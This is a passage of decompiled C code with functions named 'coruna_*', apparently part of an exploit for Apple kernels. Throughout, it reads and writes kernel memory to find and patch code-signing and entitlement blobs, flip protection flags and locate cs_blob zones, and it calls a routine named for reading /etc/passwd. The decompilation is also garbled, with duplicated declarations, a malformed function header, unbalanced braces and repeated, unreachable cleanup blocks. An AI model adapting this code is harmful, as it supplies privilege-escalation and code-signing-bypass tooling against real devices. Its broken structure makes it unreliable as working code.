                } while (version != 0);
                tag = (uint)((unsigned long)kind + 0x7fffffff4 >> 3);
              }
              size = count_3[0x10];
              if (*scratch != 0) {
                version = 0;
                data = (uint64_t *)(*(long *)(scratch + 2) + 8);
                ptr = (uint *)0x0;
                str = (uint *)0x0;
                kind = 0;
                do {
                  obj = (uint *)*data;
                  u = (*obj & 0xff00ff00) >> 8 | (*obj & 0xff00ff) << 8;
                  u = u >> 0x10 | u << 0x10;
                  buf = ptr;
                  copy = str;
                  type_id = kind;
                  if (u == 0xfade0c02) {
                    copy = obj;
                    if (*(uint *)(data + -1) != size) {
                      copy = str;
                    }
                  }
                  else if ((u == 0xfade7171) &&
                          (buf = obj, type_id = (uint)version, *(uint *)(data + -1) != 5))
                  {
                    buf = ptr;
                    type_id = kind;
                  }
                  version = version + 1;
                  data = data + 2;
                  ptr = buf;
                  str = copy;
                  kind = type_id;
                } while (*scratch != version);
                if (buf != (uint *)0x0) {
                  size = (buf[1] & 0xff00ff00) >> 8 | (buf[1] & 0xff00ff) << 8;
                  version = (unsigned long)(size >> 0x10 | size << 0x10);
                  if (copy == (uint *)0x0) {
next:
                    ls22 = version + 1;
                  }
                  else {
                    size = copy[10];
                    ls22 = (size_t)size;
                    if ((size == 0) || ((size & 0x3fff) != 0)) goto next;
                  }
                  ptr = _realloc(buf,ls22);
                  if (ptr == (void *)0x0) goto check_ok;
                  _bzero((void *)((long)ptr + version),ls22 - version);
                  *(void **)(*(long *)(scratch + 2) + (unsigned long)type_id * 0x10 + 8) = ptr;
                  size = count_3[0x10];
                }
              }
              count_3[0xc] = 1;
              *(uint **)(count_3 + 0xe) = scratch;
done:
              count_3[0x17] = tag;
              serial_8 = coruna_wire_map_lookup(count_3,size,0xfade0c02);
              if ((serial_8 != 0) &&
                 ((((count_3[0x12] = (uint)*(byte *)(serial_8 + 0x24),
                    *(unsigned long *)(size + 0x56) < 0x1f530000000000 ||
                    (serial_8 = coruna_wire_map_lookup(count_3,7,0xfade7172), serial_8 == 0)) ||
                   (serial_8 = coruna_wire_map_lookup(count_3,5,0xfade7171), serial_8 != 0)) ||
                  (err = coruna_kernel6544_via_wire_map_lookup(count_3,5,0xfade7171), err != 0)))) {
                port = 1;
                _free(err);
                return port;
              }
            }
          }
        }
      }
    }
  }
fail:
  coruna_kernel6544_via_kernel09_via_bzero_2(count_3);
  port = 0;
retry:
  _free(err);
  return port;
}





uint64_t coruna_return_zero_272a8(long handle,uint64_t val,uint64_t id_2,uint64_t size_3)
{
  int err;
  long handle;
  uint64_t u;
  uint size;
  uint scratch;
  
  scratch = 0;
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    if (1 < err - 0x1f53U) {
      if (err != 0x1809 && err != 0x1c1b) {
        return 0;
      }
      size = 0x20000;
      handle = coruna_kernel6544_via_return_zero_2c3b8(handle);
      u = 0;
      if ((handle != 0) && (u = coruna_nop_stub_6(handle,handle + 0x48,4,&scratch), (int)u != 0)) {
      *(bool *)size_3 = (scratch & size) != 0;
      u = 1;
      }
      return u;
    }
  }
  else if ((err != 0x2258 && err != 0x2712) && err != 0x225c) {
    return 0;
  }
  size = 0x80000;
fail:
  handle = coruna_kernel6544_via_return_zero_2c3b8(handle);
  u = 0;
  if ((handle != 0) && (u = coruna_nop_stub_6(handle,handle + 0x48,4,&scratch), (int)u != 0)) {
    *(bool *)size_3 = (scratch & size) != 0;
    u = 1;
  }
  return u;
}





unsigned long coruna_return_zero_27378(long arg,uint64_t val,uint64_t n,int m)

{
  int count;
  long serial_7;
  unsigned long u;
  uint size;
  uint cache_33;
  
  cache_33 = 0;
  count = *(int *)(arg + 0x140);
  if (count < 0x2258) {
    if (1 < count - 0x1f53U) {
      if (count != 0x1809 && count != 0x1c1b) {
        return 0;
      }
      size = 0x20000;
      serial_7 = coruna_kernel6544_via_return_zero_2c3b8(arg);
      u = 0;
      if (serial_7 != 0) {
      u = coruna_nop_stub_6(arg,serial_7 + 0x48,4,&cache_33);
      if ((int)u != 0) {
      if (m == 0) {
      cache_33 = cache_33 & (size ^ 0xffffffff);
      }
      else {
      cache_33 = cache_33 | size;
      }
      count = coruna_nop_stub_7(arg,serial_7 + 0x48,&cache_33,4);
      u = (unsigned long)(count != 0);
      }
      }
      return u;
    }
  }
  else if ((count != 0x2258 && count != 0x2712) && count != 0x225c) {
    return 0;
  }
  size = 0x80000;
load_ok_70:
  serial_7 = coruna_kernel6544_via_return_zero_2c3b8(arg);
  u = 0;
  if (serial_7 != 0) {
    u = coruna_nop_stub_6(arg,serial_7 + 0x48,4,&cache_33);
    if ((int)u != 0) {
      if (m == 0) {
        cache_33 = cache_33 & (size ^ 0xffffffff);
      }
      else {
        cache_33 = cache_33 | size;
      }
      count = coruna_nop_stub_7(arg,serial_7 + 0x48,&cache_33,4);
      u = (unsigned long)(count != 0);
    }
  }
  return u;
}





void coruna_mach_vm_alloc(long handle,uint64_t val,mach_vm_address_t arg,unsigned long arg_x,
                 vm_prot_t arg_x_x,int flags,int count_2)
{
  uint u;
  long handle;
  vm_map_t target;
  uint size;
  size_t ls4;
  unsigned long version;
  uint8_t *ptr;
  int err;
  kern_return_t lk8;
  int status;
  unsigned long port;
  long addr;
  long off;
  void *ptr;
  uint32_t *buf;
  long base;
  size_t ls16;
  int flags;
  mach_vm_address_t *lpm18;
  unsigned long tag;
  bool err;
  mach_vm_size_t size;
  uint scratch;
  unsigned long bootargs;
  long thread_attr;
  uint8_t host_info[8];
  int serial_buf;
  uint32_t scratch;
  mach_vm_address_t action [3];
  unsigned long block_ctx;
  uint64_t stack_guard;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t sa_saved;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t sa_new;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t sa_new;
  int path_buf;
  int tmp_buf;
  long region;
  
  region = *(long *)k_kernel_stack_chk_guard_slot;
  port = coruna_return_zero_2639c();
  if (*(long *)k_kernel_stack_chk_guard_slot == region) {
  return;
  }
  ___stack_chk_fail(port);
}





bool coruna_kernel6544_via_kernel6544_via_kernel09_via_bzero_2_2(uint64_t val,uint64_t id_2,int flags,int count_2)
{
  unsigned long u;
  uint size;
  unsigned long version;
  bool err;
  int err;
  long handle;
  unsigned long port;
  unsigned long tag;
  uint8_t scratch[104];
  
  err = coruna_plist_dict_24a54(val,id_2,scratch);
  if (err == 0) {
    return false;
  }
  handle = coruna_wire_map_lookup(scratch,0,0xfade0c02);
  if ((handle != 0) &&
     (size = (*(uint *)(handle + 8) & 0xff00ff00) >> 8 | (*(uint *)(handle + 8) & 0xff00ff) << 8,
     0x80 < (size >> 0x10 | size << 0x10) >> 10)) {
    port = *(unsigned long *)(handle + 0x50);
    u = 0x10;
    if (flags == 0) {
      u = 0;
    }
    version = (port & 0xaf00ff00ff00ff00) >> 8 | (port & 0xff00ff00ff00ff) << 8;
    version = (version & 0xffff0000ffff0000) >> 0x10 | (version & 0xffff0000ffff) << 0x10;
    tag = version >> 0x20 | version << 0x20;
    version = 0x40;
    if (count_2 == 0) {
      version = 0;
    }
    port = (port & 0xff00ff00ff00ff00) >> 8 | (port & 0xff00ff00ff00ff) << 8;
    port = (port & 0xffff0000ffff0000) >> 0x10 | (port & 0xffff0000ffff) << 0x10;
    if ((version | u | tag) == (port >> 0x20 | port << 0x20)) {
      err = true;
      coruna_kernel6544_via_kernel09_via_bzero_2(scratch);
      return err;
    }
    u = (tag & 0xff00ff00ff00ff00) >> 8 | (version | u | tag & 0xff00ff00ff00ff) << 8;
    u = (u & 0xffff0000ffff0000) >> 0x10 | (u & 0xffff0000ffff) << 0x10;
    *(unsigned long *)(handle + 0x50) = u >> 0x20 | u << 0x20;
    err = coruna_kernel6544_via_memcpy_24a7c(scratch,0);
    if (err != 0) {
      err = coruna_kernel6544_via_ctx_test_flag_9(val,scratch);
      err = err != 0;
      coruna_kernel6544_via_kernel09_via_bzero_2(scratch);
      return err;
    }
  }
  err = false;
fail:
  coruna_kernel6544_via_kernel09_via_bzero_2(scratch);
  return err;
}





uint64_t coruna_kernel6544_via_kernel6544_via_kernel09_via_bzero_2_3(uint64_t val,uint64_t id_2)
{
  uint64_t u;
  uint8_t scratch[104];
  
  u = coruna_plist_dict_24a54(val,id_2,scratch);
  if ((int)u != 0) {
    coruna_kernel6544_via_kernel09_via_bzero_2(scratch);
    u = 1;
  }
  return u;
}





void coruna_fcntl_243c4(uint64_t val,uint64_t id_2,long handle)
{
  int *err;
  unsigned long *ptr;
  long handle;
  bool err;
  int err;
  int status;
  long addr;
  long off;
  unsigned long u;
  long base;
  uint64_t *buf;
  uint64_t size;
  uint version;
  void *ptr;
  int *status;
  uint8_t kind[16];
  long scratch;
  uint bootargs;
  uint thread_attr;
  long host_info;
  long serial_buf;
  uint64_t action;
  long block_ctx;
  uint64_t scratch;
  uint64_t stack_guard;
  uint32_t sa_saved;
  uint64_t bootargs;
  long sa_new;
  long path_buf;
  uint64_t tmp_buf;
  uint64_t region;
  uint64_t thread_attr;
  uint64_t host_info;
  unsigned long plist [23];
  uint64_t url_buf;
  unsigned long serial_buf;
  unsigned long json_buf;
  uint8_t frame[20];
  uint work;
  int cache [1016];
  long cache_20;
  
  kind = (*(void (*)k_kernel_chkstk_darwin_slot)();
  addr = kind;
  cache_20 = *(long *)k_kernel_stack_chk_guard_slot;
  block_ctx = 0;
  scratch = 0;
  serial_buf = 0;
  action = 0;
  host_info = 0;
  off = coruna_kernel6544_via_kernel6544_via_return_zero_2b000_2();
  u = 0;
  if ((off == 0) ||
     (u = coruna_return_zero_24300(addr,(long)&scratch + 4,&scratch), (int)u == 0))
  if (*(long *)k_kernel_stack_chk_guard_slot == cache_20) {
  return;
  }
  ___stack_chk_fail(u);
}





unsigned long coruna_kernel6544_via_ptr_canonicalize_5(uint64_t arg,uint64_t val)

{
  int count;
  unsigned long type_id_14;
  long serial_10;
  long base;
  uint cache_20;
  uint cache_33;
  long cache_42;
  long cache_60;
  
  cache_42 = 0;
  cache_60 = 0;
  type_id_14 = coruna_iosurface_wire_meta_offsets(arg,&cache_33,&cache_20);
  if ((int)type_id_14 != 0) {
    count = coruna_kernel6544_via_ptr_canonicalize_8(arg,val,&cache_60);
    if (count == 0) {
      type_id_14 = coruna_kernel6544_residual_256(arg,cache_60 + (unsigned long)cache_33,&cache_60);
      if (((int)type_id_14 != 0) && (serial_10 = coruna_ptr_canonicalize(arg,cache_60), type_id_14 = 0, serial_10 != 0)) {
        serial_10 = cache_60 + (unsigned long)cache_20;
        type_id_14 = coruna_kernel6544_residual_256(arg,serial_10,&cache_42);
        if ((int)type_id_14 != 0) {
          if (cache_42 == 0) {
            type_id_14 = 1;
          }
          else {
            base = coruna_ptr_canonicalize(arg);
            type_id_14 = 0;
            if (base != 0) {
              count = coruna_kernel6544_via_mach_vm_machine_attribute_29df8(arg,serial_10,0);
              type_id_14 = (unsigned long)(count != 0);
            }
          }
        }
      }
    }
    else {
      type_id_14 = 0;
    }
  }
  return type_id_14;
}





uint64_t coruna_kernel6544_via_return_zero_2b0c0_2(uint64_t val,uint64_t id_2,unsigned long arg)
{
  long handle;
  uint64_t u;
  unsigned long scratch;
  
  scratch = 0;
  handle = coruna_ret_stub_3();
  u = 0;
  if (handle != 0) {
    handle = coruna_return_zero_2b0c0(val,handle);
    u = 0;
    if ((handle != 0) && (u = coruna_kernel6544_residual_256(val,handle,&scratch), (int)u != 0)) {
      if (((uint)scratch >> 2 & 1) == 0) {
        scratch = arg & 0xfffffffffffff000 | scratch | 4;
        u = coruna_kernel6544_residual_257(val,handle);
        if ((int)u == 0) {
          return u;
        }
      }
      u = 1;
    }
  }
  return u;
}





int * coruna_wire_map_slot_lookup(long handle,int flags,uint size)
{
  uint u;
  int *err;
  unsigned long size;
  
  if ((handle != 0) && (*(int *)(handle + 0x30) == 1)) {
    u = **(uint **)(handle + 0x38);
    size = (unsigned long)u;
    if (u != 0) {
      err = *(int **)(*(uint **)(handle + 0x38) + 2);
      do {
        if ((*err == flags) &&
           (u = (**(uint **)(err + 2) & 0xff00ff00) >> 8 |
                    (**(uint **)(err + 2) & 0xff00ff) << 8,
           (u >> 0x10 | u << 0x10) == size)) {
          return err;
        }
        err = err + 4;
        size = size - 1;
      } while (size != 0);
    }
  }
  return (int *)0x0;
}





void * coruna_memcpy_24a7c(void *ctx)
{
  uint u;
  void *ptr;
  unsigned long size;
  
  u = (*(uint *)((long)ctx + 4) & 0xff00ff00) >> 8 |
          (*(uint *)((long)ctx + 4) & 0xff00ff) << 8;
  size = (unsigned long)(u >> 0x10 | u << 0x10);
  ptr = _malloc(size);
  if (ptr != (void *)0x0) {
    _memcpy(ptr,ctx,size);
  }
  return ptr;
}





void coruna_bzero(void *ctx)
{
  uint u;
  void (*ptr)(void);
  unsigned long unaff_x30;
  
  if (ctx == (void *)0x0) {
    return;
  }
  u = *(uint *)((long)ctx + 4);
  if (u != 0) {
    u = (u & 0xff00ff00) >> 8 | (u & 0xff00ff) << 8;
    _bzero(ctx,(unsigned long)(u >> 0x10 | u << 0x10));
  }
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  _free(ctx);
  return;
}





void coruna_find_cs_blob_zone(long *handle)
{
  long *ptr;
  void *buf;
  uint u;
  long handle;
  uint *ptr;
  bool err;
  bool status;
  uint8_t *buf;
  bool flags;
  uint16_t size;
  int err;
  int status;
  int flags;
  uint version;
  mach_port_t lm15;
  uint port;
  int count;
  int idx;
  thread_act_t target_act;
  long addr;
  int *err;
  long off;
  void *str;
  void **lppv23;
  long base;
  uint *str;
  uint tag;
  unsigned long kind;
  unsigned long type_id;
  int *status;
  uint64_t type_id_8;
  byte count;
  unsigned long type_id_9;
  unsigned long type_id_10;
  unsigned long type_id_11;
  uint64_t scratch;
  unsigned long bootargs;
  uint thread_attr;
  uint host_info;
  unsigned long serial_buf;
  uint action;
  uint block_ctx;
  uint stack_guard;
  uint64_t sa_saved;
  uint64_t scratch;
  uint64_t sa_new;
  long path_buf;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t tmp_buf;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  long region [4];
  unsigned long plist;
  long url_buf;
  uint64_t block_ctx;
  uint64_t json_buf;
  uint64_t stack_guard;
  uint64_t frame;
  uint64_t sa_saved;
  uint64_t work;
  byte cache;
  uint8_t cache_20;
  uint cache_21;
  long cache_22;
  long cache_23;
  long cache_24;
  uint cache_25;
  uint cache_26;
  uint cache_27;
  uint64_t cache_28;
  int cache_29 [2];
  long cache_30;
  long cache_31;
  int cache_32;
  uint32_t cache_33;
  uint cache_34;
  int cache_35;
  unsigned long cache_36;
  uint cache_37;
  unsigned long cache_38;
  void *cache_39;
  uint cache_40;
  void *cache_41;
  long cache_42;
  unsigned long cache_43;
  pthread_t cache_44;
  uint cache_45;
  uint8_t cache_46[48];
  unsigned long cache_47;
  void *cache_48;
  void *cache_49;
  uint64_t cache_50;
  void *cache_51;
  unsigned long cache_52;
  uint64_t cache_53;
  unsigned long cache_54;
  uint64_t sa_new;
  unsigned long cache_55;
  uint64_t cache_56;
  long cache_57;
  unsigned long *cache_58;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t cache_59;
  uint64_t region;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t cache_60;
  unsigned long json_buf;
  uint64_t cache_61;
  long cache_62;
  uint64_t cache_63;
  uint64_t frame;
  uint64_t work;
  uint64_t cache;
  uint64_t cache_64;
  uint64_t cache_20;
  uint64_t cache_21;
  uint64_t cache_22;
  uint64_t cache_65;
  uint64_t cache_23;
  uint64_t cache_24;
  uint64_t cache_25;
  uint64_t cache_66;
  uint64_t cache_26;
  uint64_t cache_27;
  uint64_t cache_28;
  uint64_t cache_67;
  uint64_t cache_29;
  uint64_t cache_30;
  uint64_t cache_31;
  uint64_t cache_68;
  uint64_t cache_32;
  uint64_t cache_33;
  uint64_t cache_34;
  uint64_t cache_69;
  uint64_t cache_35;
  uint64_t cache_36;
  uint64_t cache_37;
  uint64_t cache_70;
  uint64_t cache_38;
  uint64_t cache_39;
  uint64_t cache_40;
  uint64_t cache_71;
  uint64_t cache_41;
  uint64_t cache_42;
  uint64_t cache_43;
  uint64_t cache_72;
  uint64_t cache_44;
  uint64_t cache_45;
  uint64_t cache_46;
  uint64_t cache_73;
  uint64_t cache_47;
  uint64_t cache_48;
  uint64_t cache_49;
  long cache_74;
  
  cache_74 = *(long *)k_kernel_stack_chk_guard_slot;
  ptr = (uint *)*handle;
  status = (int *)handle[1];
  type_id_9 = *(unsigned long *)(ptr + 0x56);
  if ((*ptr & 0x5584001) != 0 || 0x1f52ffffffffff < type_id_9) {
    cache_41 = (void *)0x0;
    cache_39 = (void *)0x0;
    cache_27 = 0xffffffff;
    cache_26 = 0;
    cache_25 = 0;
    cache_21 = 0;
    cache_22 = 0;
    cache_23 = 0;
    action = 0;
    err = coruna_return_zero_26a10(status,&cache_41,&cache_39,&cache_26,&cache_25,&cache_21);
    if (err == 0) {
fail:
      port = 0;
      *(uint *)(handle + 2) = port;
      if (*(long *)k_kernel_stack_chk_guard_slot == cache_74) {
      return;
      }
      ___stack_chk_fail();
    }
    cache_32 = -1;
    if (((((char)status[0x18] != '\0') || (*(unsigned long *)(status + 10) >> 0x1d == 0)) ||
        (((status[0x13] == cache_26 && ((status[0x15] == cache_25 || (cache_21 != 0)))) &&
         ((status[0x16] == cache_21 || (*(unsigned long *)(ptr + 0x56) < 0x1f530000000000)))))) &&
       ((addr = coruna_kernel6544_via_kernel6544_via_return_zero_2b000_2(ptr,status[0x11]), addr != 0 &&
        (err = coruna_return_zero_24300(ptr,&stack_guard,&block_ctx), err != 0)))) {
      err = coruna_nop_stub_6(ptr,addr + (unsigned long)block_ctx,8,&cache_36);
      if (err != 0) {
        if (((long)cache_36 < 0x20000000) || ((char)status[0x18] != '\0')) {
          err = coruna_kernel6544_residual_256(ptr,addr + (unsigned long)stack_guard,&cache_24);
          if ((err == 0) ||
             (err = coruna_read_etc_passwd(ptr,cache_24,&cache_22,&cache_23,&cache_27),
             idx = 5;
             if (cache_32 != -1) {
             coruna_kernel6544_via_kernel09_via_bzero_2(cache_29);
             }
             port = cache_27;
             err = idx;
             if (cache_27 != 0xffffffff) {
             if ((cache_22 != 0) && (cache_23 != 0)) {
             status = coruna_call_mach_vm_machine_attribute_29df8(ptr);
             err = 5;
             if (status != 0) {
             err = idx;
             }
             }
             _close(port);
             }
             if (cache_41 != (void *)0x0) {
             _free(cache_41);
             }
             port = (uint)(err == 0);
             *(uint *)(handle + 2) = port;
             if (*(long *)k_kernel_stack_chk_guard_slot == cache_74) {
             return;
             }
             ___stack_chk_fail();
             }
             cache_38 = 0;
             cache_39 = (void *)0x0;
             cache_37 = 0xffffffff;
             cache_36 = 0x20000000;
             cache_28 = 0;
             cache_27 = 0;
             cache_22 = 0;
             cache_23 = 0;
             cache_21 = 0;
             err = coruna_ctx_test_flag(ptr,0x5184001);
             port = 0;
             *(uint *)(handle + 2) = port;
             if (*(long *)k_kernel_stack_chk_guard_slot == cache_74) {
             return;
        }
        else {
          count = 0;
          serial_buf = cache_36;
load_ok_26:
          str = cache_39;
          if (cache_39 <= *(void **)(status + 4)) {
            err = coruna_ctx_test_flag(ptr,0x5184001);
            if (err == 0) {
              err = coruna_kernel6544_via_vm_deallocate_f7f8(ptr,*(uint64_t *)(status + 6),cache_41,str);
            }
            else {
              err = coruna_vm_deallocate_f7f8(ptr,*(uint64_t *)(status + 6),cache_41,str);
            }
            if (err != 0) {
load_ok_28:
              {
                type_id_9 = *(unsigned long *)(ptr + 0x56);
                if ((type_id_9 < 0x1f530000000000) || ((*ptr & 0x5184001) == 0))
                idx = 0;
                if (cache_32 != -1) {
                coruna_kernel6544_via_kernel09_via_bzero_2(cache_29);
                }
                port = cache_27;
                err = idx;
                if (cache_27 != 0xffffffff) {
                if ((cache_22 != 0) && (cache_23 != 0)) {
                status = coruna_call_mach_vm_machine_attribute_29df8(ptr);
                err = 5;
                if (status != 0) {
                err = idx;
                }
                }
                _close(port);
                }
                if (cache_41 != (void *)0x0) {
                _free(cache_41);
                }
                port = (uint)(err == 0);
                *(uint *)(handle + 2) = port;
                if (*(long *)k_kernel_stack_chk_guard_slot == cache_74) {
                return;
                }
                ___stack_chk_fail();
              }
              err = coruna_kernel6544_via_return_zero_2b0c0_2(ptr,status[0x11]);
              if (err != 0) {
                cache_36 = serial_buf;
                err = coruna_nop_stub_7(ptr,addr + (unsigned long)block_ctx,&cache_36,8);
                if (err != 0) {
                  type_id_9 = *(unsigned long *)(ptr + 0x56);
                  if ((type_id_9 < 0x1f530000000000) || (count != 1)) {
load_ok_30:
                    if ((type_id_9 < 0x1f530000000000) || ((*ptr & 0x5184001) == 0))
                    idx = 0;
                    if (cache_32 != -1) {
                    coruna_kernel6544_via_kernel09_via_bzero_2(cache_29);
                    }
                    port = cache_27;
                    err = idx;
                    if (cache_27 != 0xffffffff) {
                    if ((cache_22 != 0) && (cache_23 != 0)) {
                    status = coruna_call_mach_vm_machine_attribute_29df8(ptr);
                    err = 5;
                    if (status != 0) {
                    err = idx;
                    }
                    }
                    _close(port);
                    }
                    if (cache_41 != (void *)0x0) {
                    _free(cache_41);
                    }
                    port = (uint)(err == 0);
                    *(uint *)(handle + 2) = port;
                    if (*(long *)k_kernel_stack_chk_guard_slot == cache_74) {
                    return;
                    }
                    ___stack_chk_fail();
                  }
                  else {
                    err = coruna_kernel6544_via_kernel6544_via_return_zero_2b000_5(ptr,status[0x11]);
                    if (err != 0) {
                      if (((*ptr & 0x5584001) == 0) ||
                         (0x1f530f027fffff < *(unsigned long *)(ptr + 0x56))) {
                        addr = 0xa0;
                        if (*(unsigned long *)(ptr + 0x56) < 0x1f530f02800000) {
                          addr = 0xa8;
                        }
                        err = coruna_kernel6544_residual_256(ptr,*(long *)(status + 2) + addr,&cache_50);
                        if (err != 0) {
                          if (*(unsigned long *)(ptr + 0xe4) == cache_50) {
load_ok_29:
                            type_id_9 = *(unsigned long *)(ptr + 0x56);
                            {
                              if ((type_id_9 < 0x1f530000000000) || ((*ptr & 0x5184001) == 0))
                              idx = 0;
                              if (cache_32 != -1) {
                              coruna_kernel6544_via_kernel09_via_bzero_2(cache_29);
                              }
                              port = cache_27;
                              err = idx;
                              if (cache_27 != 0xffffffff) {
                              if ((cache_22 != 0) && (cache_23 != 0)) {
                              status = coruna_call_mach_vm_machine_attribute_29df8(ptr);
                              err = 5;
                              if (status != 0) {
                              err = idx;
                              }
                              }
                              _close(port);
                              }
                              if (cache_41 != (void *)0x0) {
                              _free(cache_41);
                              }
                              port = (uint)(err == 0);
                              *(uint *)(handle + 2) = port;
                              if (*(long *)k_kernel_stack_chk_guard_slot == cache_74) {
                              return;
                              }
                              ___stack_chk_fail();
                            }
                          }
                          err = coruna_kernel6544_via_nop_stub_6_10(ptr);
                          if ((err == 0) &&
                             (err = coruna_pthread_attr_setdetachstate(ptr,ptr[0xde],cache_50), err != 0)) {
                            {
                              type_id_9 = *(unsigned long *)(ptr + 0x56);
                              {
                              if ((type_id_9 < 0x1f530000000000) || ((*ptr & 0x5184001) == 0))
                              idx = 0;
                              if (cache_32 != -1) {
                              coruna_kernel6544_via_kernel09_via_bzero_2(cache_29);
                              }
                              port = cache_27;
                              err = idx;
                              if (cache_27 != 0xffffffff) {
                              if ((cache_22 != 0) && (cache_23 != 0)) {
                              status = coruna_call_mach_vm_machine_attribute_29df8(ptr);
                              err = 5;
                              if (status != 0) {
                              err = idx;
                              }
                              }
                              _close(port);
                              }
                              if (cache_41 != (void *)0x0) {
                              _free(cache_41);
                              }
                              port = (uint)(err == 0);
                              *(uint *)(handle + 2) = port;
                              if (*(long *)k_kernel_stack_chk_guard_slot == cache_74) {
                              return;
                              }
                              ___stack_chk_fail();
                              }
                            }
                            addr = coruna_kernel6544_via_kernel6544_via_return_zero_2b000_4(ptr,status[0x11],0);
                            if (addr != 0) {
                              err = coruna_return_zero_2e5d4(ptr,addr,0x10);
                              {
                                type_id_9 = *(unsigned long *)(ptr + 0x56);
                                {
                                if ((type_id_9 < 0x1f530000000000) || ((*ptr & 0x5184001) == 0))
                                idx = 0;
                                if (cache_32 != -1) {
                                coruna_kernel6544_via_kernel09_via_bzero_2(cache_29);
                                }
                                port = cache_27;
                                err = idx;
                                if (cache_27 != 0xffffffff) {
                                if ((cache_22 != 0) && (cache_23 != 0)) {
                                status = coruna_call_mach_vm_machine_attribute_29df8(ptr);
                                err = 5;
                                if (status != 0) {
                                err = idx;
                                }
                                }
                                _close(port);
                                }
                                if (cache_41 != (void *)0x0) {
                                _free(cache_41);
                                }
                                port = (uint)(err == 0);
                                *(uint *)(handle + 2) = port;
                                if (*(long *)k_kernel_stack_chk_guard_slot == cache_74) {
                                return;
                                }
                                ___stack_chk_fail();
                                }
                              }
                            }
                          }
                        }
                      }
                      else {
                        err = coruna_fcntl_243c4(ptr,status[0x11],*(uint64_t *)(ptr + 0xe4));
joined_r0x00028fb8:
                        {
                          type_id_9 = *(unsigned long *)(ptr + 0x56);
                          {
                          if ((type_id_9 < 0x1f530000000000) || ((*ptr & 0x5184001) == 0))
                          idx = 0;
                          if (cache_32 != -1) {
                          coruna_kernel6544_via_kernel09_via_bzero_2(cache_29);
                          }
                          port = cache_27;
                          err = idx;
                          if (cache_27 != 0xffffffff) {
                          if ((cache_22 != 0) && (cache_23 != 0)) {
                          status = coruna_call_mach_vm_machine_attribute_29df8(ptr);
                          err = 5;
                          if (status != 0) {
                          err = idx;
                          }
                          }
                          _close(port);
                          }
                          if (cache_41 != (void *)0x0) {
                          _free(cache_41);
                          }
                          port = (uint)(err == 0);
                          *(uint *)(handle + 2) = port;
                          if (*(long *)k_kernel_stack_chk_guard_slot == cache_74) {
                          return;
                          }
                          ___stack_chk_fail();
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
cleanup:
    idx = 5;
    if (cache_32 != -1) {
    coruna_kernel6544_via_kernel09_via_bzero_2(cache_29);
    }
    port = cache_27;
    err = idx;
    if (cache_27 != 0xffffffff) {
    if ((cache_22 != 0) && (cache_23 != 0)) {
    status = coruna_call_mach_vm_machine_attribute_29df8(ptr);
    err = 5;
    if (status != 0) {
    err = idx;
    }
    }
    _close(port);
    }
    if (cache_41 != (void *)0x0) {
    _free(cache_41);
    }
    port = (uint)(err == 0);
    *(uint *)(handle + 2) = port;
    if (*(long *)k_kernel_stack_chk_guard_slot == cache_74) {
    return;
    }
    ___stack_chk_fail();
  }
  cache_38 = 0;
  cache_39 = (void *)0x0;
  cache_37 = 0xffffffff;
  cache_36 = 0x20000000;
  cache_28 = 0;
  cache_27 = 0;
  cache_22 = 0;
  cache_23 = 0;
  cache_21 = 0;
  err = coruna_ctx_test_flag(ptr,0x5184001);
  port = 0;
  *(uint *)(handle + 2) = port;
  if (*(long *)k_kernel_stack_chk_guard_slot == cache_74) {
  return;
  }
  ___stack_chk_fail();
  }
  cache_38 = 0;
  cache_39 = (void *)0x0;
  cache_37 = 0xffffffff;
  cache_36 = 0x20000000;
  cache_28 = 0;
  cache_27 = 0;
  cache_22 = 0;
  cache_23 = 0;
  cache_21 = 0;
  err = coruna_ctx_test_flag(ptr,0x5184001);
  port = 0;
  *(uint *)(handle + 2) = port;
  if (*(long *)k_kernel_stack_chk_guard_slot == cache_74) {
  return;
load_ok_31:
  idx = 0;
load_ok_25:
  if (cache_32 != -1) {
    coruna_kernel6544_via_kernel09_via_bzero_2(cache_29);
  }
  port = cache_27;
  err = idx;
  if (cache_27 != 0xffffffff) {
    if ((cache_22 != 0) && (cache_23 != 0)) {
      status = coruna_call_mach_vm_machine_attribute_29df8(ptr);
      err = 5;
      if (status != 0) {
        err = idx;
      }
    }
    _close(port);
  }
  if (cache_41 != (void *)0x0) {
    _free(cache_41);
  }
load_ok_42:
  port = (uint)(err == 0);
done:
  *(uint *)(handle + 2) = port;
  if (*(long *)k_kernel_stack_chk_guard_slot == cache_74) {
    return;
  }
  ___stack_chk_fail();
}





uint64_t
void coruna_return_zero_26a10(long handle,uint64_t *val,unsigned long *arg,uint *size,uint *flags_2,
            uint *count_3)
{
  uint u;
  int err;
  uint32_t *ptr;
  uint64_t size;
  void *ptr;
  uint version;
  unsigned long port;
  long handle;
  int status;
  uint *buf;
  long *buf;
  uint *str;
  uint tag;
  uint *copy;
  long addr;
  unsigned long kind;
  int flags;
  uint type_id;
  
  if (*(int *)(handle + 0x30) == 0) {
    type_id = 0;
    version = *(uint *)(*(long *)(handle + 0x38) + 4);
    version = (version & 0xff00ff00) >> 8 | (version & 0xff00ff) << 8;
    version = version >> 0x10 | version << 0x10;
    flags = 0xc;
  }
  else {
    if (*(int *)(handle + 0x30) != 1) {
      return 0;
    }
    buf = *(uint **)(handle + 0x38);
    version = *buf;
    port = (unsigned long)version;
    if (version == 0) {
      type_id = 0;
      status = 0xc;
    }
    else {
      buf = (long *)(*(long *)(buf + 2) + 8);
      kind = port;
      tag = 0;
      do {
        type_id = tag;
        if (((int)buf[-1] == *(int *)(handle + 0x40)) &&
           (type_id = *(uint *)(*buf + 0x28), (type_id & 0x3fff) != 0 || type_id == 0)) {
          type_id = tag;
        }
        buf = buf + 2;
        kind = kind - 1;
        tag = type_id;
      } while (kind != 0);
      buf = (long *)(*(long *)(buf + 2) + 8);
      status = 0xc;
      do {
        tag = type_id;
        if ((int)buf[-1] != 5 || type_id == 0) {
          tag = (*(uint *)(*buf + 4) & 0xff00ff00) >> 8 |
                   (*(uint *)(*buf + 4) & 0xff00ff) << 8;
          tag = tag >> 0x10 | tag << 0x10;
        }
